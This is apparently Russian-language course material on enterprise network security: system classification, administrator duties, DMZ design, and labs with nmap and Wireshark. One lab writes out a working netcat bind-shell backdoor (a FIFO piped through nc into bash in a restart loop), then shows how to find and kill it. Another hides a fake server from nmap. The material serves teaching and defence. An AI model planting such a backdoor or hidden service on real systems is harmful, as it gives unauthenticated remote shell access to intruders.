<h1>Модуль 1. Периметры безопасности и размещение сервисов в сети предприятия</h1>

<h2>Обзор моделей безопасности и обязанностей администратора безопасности компьютерной сети</h2>

<p><a href="https://clck.ru/RLQU6">Должностная инструкция aдминистраторa информационной безопасности</a></p>

<p><a href="https://clck.ru/RLQVR">Должностная инструкция администратора безопасности компьютерных систем и сетей</a></p>

<p><a href="https://clck.ru/DXeeB">Руководящий документАвтоматизированные системы. Защита от несанкционированного доступа к информации Классификация автоматизированных систем и требования по защите информации</a></p>

<p><strong>Важный факт!</strong>
<em>Вопросы информационной безопасности можно рассматривать только 
при наличии четко определенных конфликтующих сторон.</em></p>

<p>Сокращения:</p>

<blockquote>
  <p>АС - автоматизированные системы
НСД - несанкционированный доступ
СЗИ - система защиты информации
СЗИ НСД - система защиты информации от несанкционированного доступа</p>
</blockquote>

<ol>
<li>Классификация распространяется на все действующие и проектируемые АС учреждений, организаций и предприятий, обрабатывающие конфиденциальную информацию.</li>
<li>Деление АС на соответствующие классы по условиям их функционирования с точки зрения защиты информации необходимо в целях разработки и применения обоснованных мер по достижению требуемого уровня защиты информации.</li>
<li>Дифференциация подхода к выбору методов и средств защиты определяется важностью обрабатываемой информации, различием АС по своему составу, структуре, способам обработки информации, количественному и качественному составу пользователей и обслуживающего персонала.</li>
<li><p>Необходимыми исходными данными для проведения классификации конкретной АС являются:</p>

<ul>
<li>перечень защищаемых информационных ресурсов АС и их уровень конфиденциальности;</li>
<li>перечень лиц, имеющих доступ к штатным средствам АС, с указанием их уровня полномочий;</li>
<li>матрица доступа или полномочий субъектов доступа по отношению к защищаемым информационным ресурсам АС;</li>
<li>режим обработки данных в АС.</li>
</ul></li>
<li><p>К числу определяющих признаков, по которым производится группировка АC в различные классы, относятся:</p>

<ul>
<li>наличие в АС информации различного уровня конфиденциальности;</li>
<li>уровень полномочий субъектов доступа АС на доступ к конфиденциальной информации;</li>
<li>режим обработки данных в АС - коллективный или индивидуальный.</li>
</ul></li>
<li><p>Устанавливается три группы и девять классов защищенности АС от НСД к информации.</p>

<ul>
<li>Третья группа включает АС, в которых работает один пользователь. Группа содержит два класса - 3Б и 3А.</li>
<li>Вторая группа включает АС, в которых работает много пользователей с одинаковыми правами. Группа содержит два класса - 2Б и 2А.</li>
<li>Первая группа включает многопользовательские АС. Группа содержит пять классов - 1Д, 1Г, 1В, 1Б и 1А.</li>
</ul></li>
</ol>

<p><em>Примеры</em></p>

<h3>Калькулятор Windows.</h3>

<p><img src="Калькулятор.png" alt="Калькулятор" title="" /></p>

<p>С т.з. данной программы все пользователи - один. Т.е. категория - 3.</p>

<h3>Windows 9x</h3>

<p><img src="Винда.png" alt="Винда" title="" /></p>

<p>В системе присутствует "Окно входа в систему"...</p>

<p><img src="Виндалогин.png" alt="Виндалогин" title="" /></p>

<p>... т.е. пользователи различаются. Но из-за ограничений файловой системы FAT(VFAT) 
их права не разграничены. Т.е. категория 2.</p>

<h3>Ubuntu Linux</h3>

<p><img src="Ubunluls.png" alt="Ubunluls" title="" /></p>

<p>Как мы знаем, в большинстве современных ОС имеется разделение прав доступа к объектам. Т.е. Ubuntu (например) - категория 1.</p>

<h3>Вопросы:</h3>

<p>1) Правомочно ли рассматривать Калькулятор Windows как АС?</p>

<p>2) Приведите примеры АС II категории?</p>

<p>3) Определите категорию АС: сайт статической верстки, обновление выполняется по FTP.</p>

<h3>Основные требования к АС</h3>

<p>Идентификация, проверка подлинности и контроль доступа субъектов</p>

<p>Регистрация и учет: входа (выхода) субъектов доступа в (из) систему(ы) (узел сети)</p>

<p>Регистрация и учет: выдачи печатных (графических) выходных документов</p>

<p>Регистрация и учет: запуска (завершения) программ и процессов (заданий, задач)</p>

<p>Регистрация и учет: доступа  программ  субъектов  доступа  к  файлам, </p>

<p>Регистрация и учет: доступа к терминалам, ЭВМ, узлам сети ЭВМ, каналам связи, внешним устройствам ЭВМ, программам, томам, каталогам, файлам, записям, полям записей.</p>

<p>Регистрация и учет: изменения полномочий субъектов доступа.</p>

<ul>
<li>дата и время входа (выхода) субъекта доступа в систему (из системы) или загрузки (останова) системы.</li>
<li>результат   попытки   входа:   успешная   или   неуспешная </li>
<li>несанкционированная;</li>
<li>идентификатор (код или фамилия) субъекта, предъявленный при попытке доступа;</li>
<li>должен  проводиться  учет  всех  защищаемых  носителей  информации  с помощью их маркировки и с занесением учетных данных журнала (учетную карточку);</li>
<li>учет защищаемых носителей должен проводиться в журнале с регистрацией их выдачи.</li>
</ul>

<p>Обеспечение целостности программных средств и обрабатываемой информации</p>

<ul>
<li>целостность СЗИ НСД проверяется при загрузке системы по контрольным суммам компонент СЗИ;</li>
<li>целостность  программной  среды  обеспечивается  использованием трансляторов с языков высокого уровня и отсутствием средств модификации объектного  кода  программ  в  процессе  обработки  и  хранения защищаемой информации;</li>
<li>должно проводиться периодическое тестирование функций СЗИ НСД при изменении программной среды и персонала АС с помощью тест-программ, имитирующих попытки НСД;</li>
<li>должны  быть  в  наличии  средства  восстановления  СЗИ  НСД, предусматривающие ведение двух копий программных средств СЗИ НСД и их периодическое обновление и контроль работоспособности.</li>
</ul>

<p>Наличие администратора (службы) защиты информации в АС</p>

<p>Периодическое тестирование СЗИ НСД</p>

<p>Наличие средств восстановления СЗИ НСД</p>

<h3>Задачи и функции Администратора информационной безопасности</h3>

<ul>
<li>Kонтроль эффективности защиты информации;</li>
<li>Cопровождение СЗИ от  НСД и основных технических средств и систем;</li>
<li>Kонтроль разграничения доступа.</li>
<li>Kонтроль соответствия действий пользователей АС требованиям.</li>
<li>Участие на стадии проектирования (внедрения) АС в разработке технологии обработки информации ограниченного доступа (далее – информации) по вопросам:
<ul>
<li>организации порядка учета, хранения и обращения с документами и носителями информации;</li>
<li>определения степени секретности отдельных документов, носителей и массивов информации;</li>
<li>подготовки инструкций, определяющих задачи, функции, ответственность, права и обязанности  администраторов и пользователей АС по вопросам защиты информации, а также ответственных по защите информации в процессе автоматизированной обработки информации.</li>
</ul></li>
<li>Сопровождение СЗИ от НСД к ней, в том числе средств криптографической защиты информации.</li>
<li>Контроль соответствия общесистемной программной среды стандарту (контроль целостности программного обеспечения) и проверка включаемых в АС новых программных средств.</li>
<li>Методическое руководство работой администраторов и пользователей АС в вопросах обеспечения информационной безопасности.</li>
<li>Ведение переченя установленных в подразделениях ОТСС, СЗИ от НСД и перечень задач, решаемых с их использованием.</li>
<li>Непосредственное управление режимами работы и административную поддержку функционирования \ применяемых на рабочих станциях специальных программных и программно-аппаратных СЗИ от НСД.</li>
<li>Периодически проверять состояние используемых СЗИ от НСД, осуществлять проверку правильности их настройки (выборочное тестирование).</li>
<li>Вести журнал учета нештатных ситуаций, фактов вскрытия и опечатывания, защищенных СВТ, выполнения профилактических работ, установки и модификации аппаратных и программных СЗИ.</li>
<li>Проводить работу по выявлению возможности вмешательства в процесс функционирования АС и осуществления НСД к информации и техническим средствам РС.</li>
<li>Докладывать руководству о выявленных угрозах безопасности информации, обрабатываемой в АС, об имевших место попытках НСД к информации и техническим средствам РС.</li>
</ul>

<h2>Разделение сервисов сети предприятия</h2>

<h3>Вариант 1. Плоская сеть</h3>

<p><img src="плоскаясеть.jpg" alt="плоская сеть" title="" /></p>

<p>В данном варианте все узлы корпоративной сети содержатся в одной, общей для всех сети («Внутренняя сеть»), в рамках которой коммуникации между ними не ограничиваются. Сеть подключена к Интернет через пограничный маршрутизатор/межсетевой экран.</p>

<p>Плюсы варианта:</p>

<ul>
<li><p>Минимальные требования к функционалу IFW (можно сделать практически на любом, даже домашнем роутере).</p></li>
<li><p>Минимальные требования к знаниям специалиста, осуществляющего реализацию варианта.</p></li>
</ul>

<p>Минусы варианта:</p>

<ul>
<li>Минимальный уровень безопасности. В случае взлома, при котором Нарушитель получит контроль над одним из опубликованных в Интернете серверов, ему для дальнейшей атаки становятся доступны все остальные узлы и каналы связи корпоративной сети.</li>
</ul>

<h3>Вариант 2. DMZ</h3>

<p><img src="дмз.jpg" alt="dmz" title="" /></p>

<p>Для устранения этого недостатка узлы сети, доступные из Интернет, помещают в специально выделенный сегмент – демилитаризованную зону (DMZ). DMZ организуется с помощью межсетевых экранов, отделяющих ее от Интернет 
(IFW) и от внутренней сети (DFW).</p>

<p>При этом правила фильтрации межсетевых экранов выглядят следующим образом:</p>

<ul>
<li>Из внутренней сети можно инициировать соединения в DMZ и в WAN (Wide Area Network).</li>
<li>Из DMZ можно инициировать соединения в WAN.</li>
<li>Из WAN можно инициировать соединения в DMZ.</li>
<li>Инициация соединений из WAN и DMZ ко внутренней сети запрещена.</li>
</ul>

<p>Плюсы варианта:</p>

<ul>
<li>Повышенная защищённость сети от взломов отдельных сервисов. Даже если один из серверов будет взломан, Нарушитель не сможет получить доступ к ресурсам, находящимся во внутренней сети (например, сетевым принтерам, системам видеонаблюдения и т.д.).</li>
</ul>

<p>Минусы варианта:</p>

<ul>
<li>Сам по себе вынос серверов в DMZ не повышает их защищенность.</li>
<li>Необходим дополнительный МЭ для отделения DMZ от внутренней сети.</li>
</ul>

<h3>Вариант 3. Разделение сервисов на Front-End и Back-End</h3>

<p><img src="фэбэ.jpg" alt="Front-End и Back-End" title="" /></p>

<p>Одним из вариантов исправления ситуации является разделение функционала сервиса на две части: Front-End и Back-End. При этом каждая часть располагается на отдельном сервере, между которыми организуется сетевое взаимодействие. Сервера Front-End, реализующие функционал взаимодействия с клиентами, находящимися в Интернет, размещают в DMZ, а сервера Back-End, реализующие остальной функционал, оставляют во внутренней сети. Для взаимодействия между ними на DFW создают правила, разрешающие инициацию подключений от Front-End к Back-End.</p>

<p>Плюсы варианта:</p>

<ul>
<li>В общем случае атаки, направленные против защищаемого сервиса, могут «споткнуться» об Front-End, что позволит нейтрализовать или существенно снизить возможный ущерб. Например, атаки типа TCP SYN Flood или slow http read, направленные на сервис, приведут к тому, что Front-End сервер может оказаться недоступен, в то время как Back-End будет продолжать нормально функционировать и обслуживать пользователей.</li>
<li>В общем случае на Back-End сервере может не быть доступа в Интернет, что в случае его взлома (например, локально запущенным вредоносным кодом ) затруднит удаленное управление им из Интернет.</li>
<li>Front-End хорошо подходит для размещения на нем межсетевого экрана уровня приложений (например, Web application firewall) или системы предотвращения вторжений (IPS, например snort).</li>
</ul>

<p>Минусы варианта:</p>

<ul>
<li>Для связи между Front-End и Back-End на DFW создается правило, разрешающее инициацию соединения из DMZ во внутреннюю сеть, что порождает угрозы, связанные с использованием данного правила со стороны других узлов в DMZ (например, за счет реализации атак IP spoofing, ARP poisoning и т. д.)</li>
<li>Не все сервисы могут быть разделены на Front-End и Back-End.</li>
<li>В компании должны быть реализованы бизнес-процессы актуализации правил межсетевого экранирования.</li>
<li>В компании должны быть реализованы механизмы защиты от атак со стороны Нарушителей, получивших доступ к серверу в DMZ.</li>
</ul>

<h1>Лабораторные работы: Развертывание шлюза и сетей предприятия</h1>

<h2>Работа с nmap</h2>

<pre><code>student@PC / $ nmap localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-12 18:03 +05
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000084s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
631/tcp  open  ipp
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
student@PC / $ nmap -A localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-12 18:03 +05
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000081s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 34:ca:ed:e8:f9:61:1d:4a:6f:35:20:04:1e:2c:6c:a1 (RSA)
|_  256 12:15:e1:57:9a:92:98:0c:9f:bd:9b:0a:b1:29:bc:8e (ECDSA)
25/tcp   open  smtp     Exim smtpd 4.89
| smtp-commands: PC Hello localhost [127.0.0.1], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp   open  http     Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
631/tcp  open  ipp      CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Home - CUPS 2.2.1
8081/tcp open  backdoor No-auth shell (**BACKDOOR**)
Service Info: Host: PC; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
</code></pre>

<h2>Cозздание бэкдора</h2>

<pre><code>student@PC / $ cd /tmp
student@PC /tmp/ $ mkfifo fifo_file
student@PC /tmp/ $ cat fifo_file | nc -l -p 8080 | bash &gt; fifo_file

while true
do
    cat fifo_file | nc -l -p 8080 | bash &gt; fifo_file    
done
</code></pre>

<h2>Устранение бэкдора</h2>

<pre><code>student@PC / $ netstat -apn | grep 8080
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      29656/nc            
student@PC / $ ps fax | grep 29656
29779 pts/2    S+     0:00  |   |   \_ grep --color=auto 29656
29656 pts/4    S+     0:00  |       \_ nc -l -p 8080
student@PC / $ ps fax | grep -B 3 29656
 4943 pts/1    Ss+    0:00  |   \_ bash
12740 pts/2    Ss     0:00  |   \_ bash
29788 pts/2    R+     0:00  |   |   \_ ps fax
29789 pts/2    S+     0:00  |   |   \_ grep --color=auto -B 3 29656
16188 pts/3    Ss+    0:00  |   \_ bash
29186 pts/4    Ss     0:00  |   \_ bash &lt; родитель
29655 pts/4    S+     0:00  |       \_ cat aa
29656 pts/4    S+     0:00  |       \_ nc -l -p 8080
^^^^^ PID бэкдора
student@PC / $ kill 29656 бэкдор перезапустился
student@PC / $ kill 29186 
student@PC / $ kill -9 29186 бэкдор уничтожен
student@PC / $ netstat -apn | grep 8080
                            пусто!
student@PC / $ nmap localhost
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
631/tcp open  ipp
                                                        Порта 8080 нет в списке!
</code></pre>

<h2>Настройка шлюза для подключения сети предприятия к Internet</h2>

<p><a href="https://clck.ru/RLqPk">Обеспечение работоспособности и защиты межсетевого экрана с помощью iptables</a></p>

<p><a href="https://clck.ru/RMGKn">Проброс портов в локальную сеть с помощью iptables</a></p>

<p>1) Изучить литературу по ссылке.</p>

<p>2) Используя виртуальную машину (или хост) сконфигурировать:</p>

<ul>
<li>Файервол плоской сети</li>
<li>Проброс порта 80 на один из внутренних хостов</li>
</ul>

<p>3) Продемонстрировать результат, используя nmap для тестирования.</p>

<p><a href="https://www.youtube.com/watch?v=wJARN099DUw">Работа с git</a></p>

<h1>Модуль 2 Анализ информационных систем предприятия с точки зрения безопасности</h1>

<h2>Обзор сканеров сетей и анализаторов траффика</h2>

<p><a href="https://clck.ru/RMuaG">21 лучший инструмент Kali Linux для взлома и тестирования на проникновение</a></p>

<h3>Инструмент Nmap</h3>

<p>Nmap — свободная утилита, предназначенная для разнообразного настраиваемого сканирования IP-сетей с любым количеством объектов, определения состояния объектов сканируемой сети (портов и соответствующих им служб). Изначально программа была реализована для систем UNIX, но сейчас доступны версии для множества операционных систем.</p>

<p>Nmap использует множество различных методов сканирования, таких как UDP, TCP (connect), TCP SYN (полуоткрытое), FTP-proxy (прорыв через ftp), Reverse-ident, ICMP (ping), FIN, ACK, Xmas tree, SYN- и NULL-сканирование. Nmap также поддерживает большой набор дополнительных возможностей, а именно: определение операционной системы удалённого хоста с использованием отпечатков стека TCP/IP, «невидимое» сканирование, динамическое вычисление времени задержки и повтор передачи пакетов, параллельное сканирование, определение неактивных хостов методом параллельного ping-опроса, сканирование с использованием ложных хостов, определение наличия пакетных фильтров, прямое (без использования portmapper) RPC-сканирование, сканирование с использованием IP-фрагментации, поиск уязвимостей SQL Injection, а также произвольное указание IP-адресов и номеров портов сканируемых сетей.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Nmap-4.53.png/800px-Nmap-4.53.png" alt="Nmap-4.53.png" title="" /></p>

<h3>Инструмент Wireshark</h3>

<p>Wireshark — программа-анализатор трафика для компьютерных сетей Ethernet и некоторых других. Имеет графический пользовательский интерфейс. Изначально проект назывался Ethereal, но, из-за проблем с торговой маркой, в июне 2006 года проект был переименован в Wireshark.</p>

<p>Функциональность, которую предоставляет Wireshark, очень схожа с возможностями программы tcpdump, однако Wireshark имеет графический пользовательский интерфейс и гораздо больше возможностей по сортировке и фильтрации информации. Программа позволяет пользователю просматривать весь проходящий по сети трафик в режиме реального времени, переводя сетевую карту в неразборчивый режим (англ. promiscuous mode).</p>

<p>Программа распространяется под свободной лицензией GNU GPL и использует для формирования графического интерфейса кроссплатформенную библиотеку GTK+ (планируется переход на Qt). Существуют версии для большинства UNIX-подобных систем, в том числе GNU/Linux, Solaris, FreeBSD, NetBSD, OpenBSD, Mac OS X, а также для Windows.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/Wireshark_3.0.3_screenshot.png/800px-Wireshark_3.0.3_screenshot.png" alt="Wireshark" title="" /></p>

<h3>Инструмент Nessus</h3>

<p>Nessus — программа для автоматического поиска известных изъянов в защите информационных систем. Она способна обнаружить наиболее часто встречающиеся виды уязвимостей, например:
Программа имеет клиент-серверную архитектуру, что сильно расширяет возможности сканирования.
Согласно проведенному порталом securitylab.ru опросу, nessus используют 17 % респондентов 
Прежде всего используется для сканирования портов и определяет сервисы, использующие их. Также проводится проверка сервисов по базе уязвимостей. Для тестирования уязвимостей используются специальные плагины, написанные на языке NASL(Nessus Attack Scripting Language).</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Nessus_ng_report.png" alt="Nessus-Professional-FullColor-RGB.svg" title="" /></p>

<h3>Инструмент John the Ripper</h3>

<p>John The Ripper (досл. Джон-потрошитель) — свободная программа, предназначенная для восстановления паролей по их хешам. Основное назначение программы — аудит слабых паролей в UNIX системах путём перебора возможных вариантов. ПО JtR способно создавать словари любой сложности, а также извлекать хеш из файла, что является одной из самых сильных сторон JtR по сравнению с аналогичными программами. Программа также может выполнять аудит NTLM хешей, Kerberos, и др. Существуют реализации под различные ОС. Весьма популярна из-за поддержки большого количества хешей, автораспознавания хеша и настраиваемого взломщика. Также поддерживает множество модулей, включая сторонние, предоставляющих поддержку MD4 хешей, LDAP и MySQL паролей и т.д. Кроме хешей паролей доступен перебор паролей к архивам, атаки на методы аутентификации (WPA, HMAC,...). Существует кросс-платформенный графический интерфейс Johny - GUI, который требуется устанавливать отдельно. На 2012 год поддерживалось более 30 форматов в jumbo версии. По состоянию на июль 2018 года JtR bleeding-jumbo версия поддерживает 262 формата.
На компьютерном сленге среди разработчиков JtR упоминается, как кровотечение.[источник не указан 424 дня]
Ниже представлен пример вывода программы во время работы в операционной системе Linux.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ef/Image-wertfghjnmbvc.jpg/800px-Image-wertfghjnmbvc.jpg" alt="Image-wertfghjnmbvc.jpg" title="" /></p>

<h3>Инструмент Snort</h3>

<p>Snort — свободная сетевая система предотвращения вторжений (IPS) и обнаружения вторжений (IDS) с открытым исходным кодом, способная выполнять регистрацию пакетов и в реальном времени осуществлять анализ трафика в IP-сетях.
Создана Мартином Рёшем (англ. Martin Roesch), в дальнейшем развивалась и поддерживалась основанной им компанией Sourcefire (поглощена Cisco в 2013 году).
Выполняет протоколирование, анализ, поиск по содержимому, а также широко используется для активного блокирования или пассивного обнаружения целого ряда нападений и зондирований, таких как попытки атак на переполнение буфера, скрытое сканирование портов, атаки на веб-приложения, SMB-зондирование и попытки определения операционной системы. Программное обеспечение в основном используется для предотвращения проникновения, блокирования атак, если они имеют место.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Snort_ids_console.gif/800px-Snort_ids_console.gif" alt="Snort ids console.gif" title="" /></p>

<h3>Инструмент Nikto</h3>

<p>Nikto — веб-сканер, проверяющий веб-серверы на самые частые ошибки, возникающие обычно из-за человеческого фактора. Проверяет целевой веб-сервер на наличие опасных файлов и исполняемых сценариев, инструментов администрирования базами данных, устаревшего программного обеспечения.
Nikto — это  open-source веб-сканер, однако некоторые файлы, которые он использует для работы, таковыми не являются.
Nikto выиграл "Best IT Security Tools for 2009" от Security-Database в номинации программ с открытым исходным кодом для сканирования приложений.</p>

<h3>Инструмент Tripwire</h3>

<p>Tripwire — программа для мониторинга и предупреждения об изменениях файлов в системе. Проект имеет свободный исходный код, основан на разработках компании Tripwire, Inc. начала 2000-х годов.</p>

<p>Tripwire функционирует как хостовая система обнаружения вторжений и ведет наблюдение и анализ изменений файлов внутри системы. Отслеживания сетевого трафика приложение не производит.</p>

<p>Во время установки Tripwire сканирует файловую систему и сохраняет информацию о каждом найденном файле в базе данных. При последующих запусках программа сканирует те же файлы, сравнивает результаты с сохраненными в базе данных и, при необходимости, сообщает об изменениях пользователю. Для проверки целостности данных используется значения хеш-сумм, что позволяет не хранить полное содержимое файлов.</p>

<h3>Инструмент OSSEC</h3>

<p>OSSEC – это хостовая система обнаружения вторжений (HIDS), свободная и с открытым исходным кодом. Она ведёт анализ системных логов, проверку целостности, наблюдение за реестром ОС Windows, обнаружение руткитов, оповещение в заданное время и если будет обнаружено какое-либо событие. Она предоставляет функцию обнаружения вторжений для большинства операционных систем, включая Linux, OpenBSD, FreeBSD, Mac OS X, Solaris и Windows. Её кроссплатформенная архитектура позволяет легко управлять и наблюдать сразу за несколькими операционными системами. Она написана Даниэлем Б. Сидом, и доступна с 2004 года. </p>

<p>В июне 2008 года проект OSSEC и все копирайты, принадлежащие лидеру проекта, Даниэлю Б. Сиду, приобрела компания Third Brigade. Компания обязуется совмещать разработку программы вместе с сообществом Open Source и предоставлять коммерческую поддержку и обучение пользователям OSSEC.</p>

<h2>Лабораторные работы</h2>

<h3>Определение списка хостов с использованием nmap</h3>

<pre><code>$ nmap 192.168.43.*
</code></pre>

<p>Результат:</p>

<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:23 +05
Nmap scan report for gateway (192.168.43.1)
Host is up (0.025s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for microlab (192.168.43.25)
Host is up (0.000044s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for macrolab (192.168.43.77)
Host is up (0.025s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
23/tcp open  telnet

Nmap scan report for extralab (192.168.43.180)
Host is up (0.012s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
631/tcp open  ipp

Nmap done: 256 IP addresses (4 hosts up) scanned in 6.08 seconds
</code></pre>

<h3>Определение типа сервиса на указанном хосте/порту</h3>

<p>Используется типовой порт:</p>

<pre><code>$ nmap -A -p 631 192.168.43.180
</code></pre>

<p>Результат:</p>

<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:28 +05
Nmap scan report for extralab (192.168.43.180)
Host is up (0.0026s latency).
PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Home - CUPS 2.2.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
</code></pre>

<p>Обнаружен CUPS версии 2.2.1.</p>

<p><img src="cups.png" alt="cups" title="" /></p>

<p>Используется "левый" порт и фальшивый сервер:</p>

<p><img src="fakehttp.png" alt="fakehttp" title="" /></p>

<pre><code>echo "HTTP/1.1 200 OK"
echo "Date: Wed, 11 Feb 2009 11:20:59 GMT"
echo "Server: Apache"
echo "X-Powered-By: PHP/5.2.4-2ubuntu5wm1"
echo "Last-Modified: Wed, 11 Feb 2009 11:20:59 GMT"
echo "Content-Language: ru"
echo "Content-Type: text/html; charset=utf-8"
echo "Connection: close"
echo ""
echo "&lt;pre&gt;"
date
echo "&lt;/pre&gt;"
</code></pre>

<p>Peзультат:</p>

<pre><code>$ nmap -A -p 8080 localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:46 +05
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000065s latency).

PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy Apache
| fingerprint-strings: 
|   NULL: 
|     HTTP/1.1 200 OK
|     Date: Wed, 11 Feb 2009 11:20:59 GMT
|     Server: Apache
|     X-Powered-By: PHP/5.2.4-2ubuntu5wm1
|     Last-Modified: Wed, 11 Feb 2009 11:20:59 GMT
|     Content-Language: ru
|     Content-Type: text/html; charset=utf-8
|     Connection: close
|     &lt;pre&gt;
|     2020 12:46:01 +05
|_    &lt;/pre&gt;
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=10/13%Time=5F855B39%P=x86_64-pc-linux-gnu%r(N
SF:ULL,111,"HTTP/1\.1\x20200\x20OK\nDate:\x20Wed,\x2011\x20Feb\x202009\x20
SF:11:20:59\x20GMT\nServer:\x20Apache\nX-Powered-By:\x20PHP/5\.2\.4-2ubunt
SF:u5wm1\nLast-Modified:\x20Wed,\x2011\x20Feb\x202009\x2011:20:59\x20GMT\n
SF:Content-Language:\x20ru\nContent-Type:\x20text/html;\x20charset=utf-8\n
SF:Connection:\x20close\n\n&lt;pre&gt;\n\xd0\x92\xd1\x82\x2013\x20\xd0\xbe\xd0\x
SF:ba\xd1\x82\x202020\x2012:46:01\x20\+05\n&lt;/pre&gt;\n");
</code></pre>

<p>Peзультат на порту 18765:</p>

<pre><code>$ nmap -A localhost
...
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
631/tcp open  ipp     CUPS 2.3
...
</code></pre>

<p>Фальшивый сервер <em>не обнаружен!</em></p>

<pre><code>$ while true; do cat a | nc -l -p 18765 | ./http.sh &gt; a; done
GET / HTTP/1.0

$ while true; do cat a | nc -l -p 8080 | ./http.sh &gt; a; done
GET / HTTP/1.0

OPTIONS / HTTP/1.0

GET / HTTP/1.1
Host: localhost:8080
Connection: close
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

PROPFIND / HTTP/1.1
Depth: 1
Content-Length: 0
Host: localhost:8080
Connection: close
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

GET / HTTP/1.1
Host: localhost:8080
Connection: close
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

GET / HTTP/1.1
Host: localhost:8080
Connection: close
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
</code></pre>

<p>Сервер возвращает случайные коды:</p>

<pre><code>$ while true; do cat a | nc -l -p 8080 | ./http.sh &gt; a; done
GET / HTTP/1.0

ieU��random1random2random3random4
                                 /
GET / HTTP/1.1
Connection: close
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

GET /favicon.ico HTTP/1.1
Connection: close
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

�f��Q�%�/N�+����l[��f#B�i�

                          H� �Vd�
                                 �b%�]eWP]�25&gt;�F�w�%شJueJ�395/�,�0��̨̩̪���������]�a�W�S�+�/������������`�V�R�$�(kj�s�w�
�8���   �2��ED������Q������P=�&lt;���A�
                                        localhost



*(
GET / HTTP/1.1
Connection: close
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
</code></pre>

<p>Результат:</p>

<pre><code>$ nmap -A localhost -p 8080
PORT     STATE SERVICE     VERSION
8080/tcp open  http-proxy?
</code></pre>

<p>Сервер не распознан. Что не мешает злоумышленнику работать с ним. </p>

<p>Вывод. От nmap можно спрятать сервер, если разместить его вне диапазона портов, 
сканируемых по-умолчанию и нарушить алгоритм его работы. 
На действия злоумышленника это никак не повлияет.</p>

<h3>Расшифровка http-траффика с Wireshark</h3>

<p><img src="wireshark.png" alt="Wireshark" title="" /></p>

<p>Провели сканирование фэйкового http-сервера и получили следующий траффик:</p>

<p><img src="decode_0.png" alt="Wireshark" title="" /></p>

<h3>Задача:</h3>

<p>Провести сканирование собственного хоста с проброшенным портом и:</p>

<ul>
<li>определить факт сканирования по данным wireshark</li>
<li>определить используемое ПО</li>
</ul>

<h2>Подробнее про сканирование</h2>

<p>Cocтояния порта:
- open (открытый порт)  — порт открыт, и служба принимает TCP- или UDP-соединения по этому порту (данный порт наиболее уязвим для взлома);
- filtered — порт закрыт брандмауэром, иной блокирующей программой или службой (правила роутера, аппаратный брандмауэр и т.п.);
- closed — порт закрыт, так как нет службы или иной программы, прослушивающей этот порт на компьютере.
